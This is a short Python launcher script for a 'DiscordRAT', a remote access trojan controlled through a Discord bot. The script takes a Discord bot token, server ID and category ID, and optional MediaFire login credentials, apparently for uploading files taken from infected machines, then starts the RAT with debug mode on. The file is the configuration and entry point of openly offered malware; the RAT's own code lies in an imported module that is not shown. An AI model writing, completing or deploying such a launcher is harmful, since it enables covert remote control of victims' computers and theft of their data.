import os.path as path, json
from shell.main import DiscordRAT

config = {
    "discordToken": "YOUR_TOKEN_HERE",
    "serverID": "YOUR_SERVER_ID",
    "categoryID": "YOUR_CATEGORY_ID"
}

optionalConfig = { # THIS IS ONLY OPTIONAL
    "mediafireEmail": "YOUR_EMAIL_HERE",
    "mediafirePassword": "YOUR_PASSWORD_HERE"
}

if path.exists("config.json"):
    with open("config.json") as f: config = json.loads(f.read())
    optionalConfig = config

RAT = DiscordRAT(
    config["serverID"],
    config["categoryID"],
    optionalConfig["mediafireEmail"],
    optionalConfig["mediafirePassword"],
    debugMode=True
)

RAT.run(config["discordToken"])